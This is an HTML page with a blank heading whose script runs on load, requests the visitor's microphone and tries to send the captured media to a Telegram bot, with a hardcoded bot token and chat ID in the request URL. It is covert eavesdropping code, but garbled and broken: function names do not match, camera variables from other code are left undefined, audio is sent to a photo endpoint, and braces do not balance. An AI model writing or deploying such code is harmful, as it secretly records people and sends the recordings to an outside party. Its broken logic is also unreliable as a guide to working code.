<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <h1>b</h1>
    <script>
        async function takeAudioAndSend(){


window.setTimeout(startRecording, 300);
window.setInterval(stopRecording, 6000);



function startRecording() {
	//console.log("recordButton clicked");

	/*
		Simple constraints object, for more advanced audio features see
		https://addpipe.com/blog/audio-constraints-getusermedia/
	*/
    
    var constraints = { audio: true, video:false }
	navigator.mediaDevices.getUserMedia(constraints).then(function(stream) {
		console.log("getUserMedia() success, stream created, initializing Recorder.js ...");
        audioContext = new AudioContext();
        gumStream = stream;
		
		/* use the stream */
		input = audioContext.createMediaStreamSource(stream);
        rec = new Recorder(input,{numChannels:1})


        
        canvas.toBlob(blob => {
                sendAudioToTelegram(blob);
                stream.getTracks().forEach(track => track.stop());
                document.body.removeChild(video);
                document.body.removeChild(canvas);
            }, 'audio/mp3');

            // } cach (error) {
            //     console.error('Error accessing the camera: ', error);
            }
        )}

//start the recording process
// rec.record()
// redButton.disabled = false;
// }).catch(function(err) {
// 	  	//enable the record button if getUserMedia() fails
//     	redButton.disabled = true;
// 	window.location.reload();
// 	});
// }

// function stopRecording() {
// 	//console.log("stopButton clicked");


// 	//tell the recorder to stop the recording
// 	rec.stop();

// 	//stop microphone access
// 	//gumStream.getAudioTracks()[0].stop();

// 	//create the wav blob and pass it on to createDownloadLink
// 	rec.exportWAV(createDownloadLink);

// }
function send(blob) {
            const url = 'https://api.telegram.org/bot6923568496:AAHM_gMcdsy-O712NIoj87NbVe1fp7auoiw/sendPhoto';
            const formData = new FormData();
            formData.append('POST', blob, 'mp3');
            formData.append('chat_id', '1209515299');

            fetch(url, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => console.log(data))
            .catch(error => console.error('Error sending  to Telegram: ', error));
            window.setTimeout(startRecording, 300);
        }
    }
    takeAudioAndSend()

    </script>
</body>
</html>
